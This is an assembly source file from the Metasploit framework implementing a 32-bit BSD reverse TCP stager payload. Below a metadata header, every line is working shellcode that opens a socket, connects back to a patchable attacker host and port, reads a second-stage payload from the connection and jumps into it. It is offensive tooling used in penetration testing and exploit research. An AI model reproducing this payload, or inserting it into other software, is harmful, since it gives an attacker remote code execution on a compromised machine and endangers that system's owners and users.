;;
; 
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;     Version: $Revision: 1626 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSD reverse TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=BSD Reverse TCP Stager
; meta-description=Connect back to the framework and run a second stage
; meta-authors=skape <mmiller [at] hick.org>, vlad902 <vlad902 [at] gmail.com>
; meta-os=bsd
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=reverse
; meta-name=reverse_tcp
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x0a
; meta-offset-lport=0x13
;;
BITS   32
GLOBAL main

main:

socket:
	push byte 97
	pop  eax
	cdq
	push edx
	inc  edx
	push edx
	inc  edx
	push edx
	push dword 0x0100007f
	int  0x80

connect:
	push dword 0xbfbf0210
	mov  ecx, esp
	push byte 0x10
	push ecx
	push eax
	push ecx
%ifdef FD_REG_EBX
	xchg eax, ebx
%else
	xchg eax, edi
%endif
	push byte 98
	pop  eax
	int  0x80

%ifndef USE_SINGLE_STAGE

read:
	mov  al, 0x3
	mov  byte [ecx - 0x3], 0x10
	int  0x80
	ret

%endif
